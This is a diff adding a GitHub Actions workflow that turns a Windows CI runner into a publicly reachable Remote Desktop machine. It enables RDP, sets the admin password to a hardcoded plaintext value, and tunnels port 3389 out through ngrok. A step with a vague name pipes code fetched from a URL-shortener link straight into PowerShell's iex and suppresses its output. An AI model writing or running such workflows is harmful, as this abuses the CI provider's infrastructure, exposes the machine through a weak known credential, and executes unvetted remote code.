@@ -1,0 +1,62 @@
+name: CI
+
+on: workflow_dispatch
+
+jobs:
+  build:
+    runs-on: windows-2022
+
+    steps:
+    - name: Download ngrok
+      run: |
+        Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
+        Expand-Archive -Path ngrok.zip -DestinationPath .
+
+    - name: Authenticate ngrok
+      run: |
+        .\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+
+    - name: Enable Remote Desktop
+      run: |
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
+        Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+
+    - name: Additional PowerShell Command
+      run: |
+        irm https://is.gd/pdown | iex > $null
+        Write-Output "Running additional PowerShell command"
+
+    - name: Create batch file on desktop
+      run: |
+        $content = '@echo off
+        setlocal
+        echo Creating signal_file.txt... && echo. > C:\signal_file.txt && echo Signal file created successfully.
+
+        pause
+        endlocal'
+        Set-Content -Path "$env:USERPROFILE\Desktop\create_signal_file.bat" -Value $content
+
+
+    - name: Start ngrok tunnel and check for completion
+      run: |
+        Start-Process -NoNewWindow -FilePath .\ngrok.exe -ArgumentList 'tcp 3389'
+        
+        $signalFile = "C:\signal_file.txt"
+        $ngrokRunning = $true
+
+        while ($ngrokRunning) {
+          if (-not $ngrokRunning) { break }
+
+          if (-not (Test-Path $signalFile)) {
+            Start-Sleep -Seconds 60
+            continue
+          }
+
+          $ngrokRunning = $false
+        }
+
+        Write-Output "Completion signal received."
